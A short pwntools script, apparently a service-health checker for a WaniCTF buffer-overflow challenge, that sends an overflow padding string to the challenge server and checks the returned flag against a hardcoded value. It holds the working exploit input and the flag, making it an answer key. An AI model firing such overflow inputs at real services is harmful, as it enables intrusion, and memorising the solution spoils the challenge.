import pwn


def read_until(io, s):
    ret = b""
    while ret.find(s) == -1:
        ret += io.read(1)
    return ret


def get_flag_msg(ret):
    flag_start = ret.find(b"FLAG{")
    print(flag_start)
    flag_end = ret.find(b"}", flag_start)
    print(flag_end)
    return ret[flag_start : flag_end + 1]


def check_pwn_BOF(host):
    # connect check
    try:
        io = pwn.remote(host, 9002, timeout=3)
    except Exception:
        return 2

    try:
        ret = read_until(io, b"\n")
        print(ret)
        io.send(b"012345678901234567890123456789012345678901234567890123456789!\n")
        ret = read_until(io, b"}")
        print(ret)
        flag = get_flag_msg(ret)

        if flag == b"FLAG{D0_y0U_kN0w_BuFf3r_0Ver_fL0w?_ThA2k_y0U_fOR_s01v1ng!!}":
            return 0
        return 1

    except Exception as e:
        print(e)
        return 1


if __name__ == "__main__":
    ret = check_pwn_BOF("sarutest.pwn.wanictf.org")
    if ret == 0:
        print("alive")
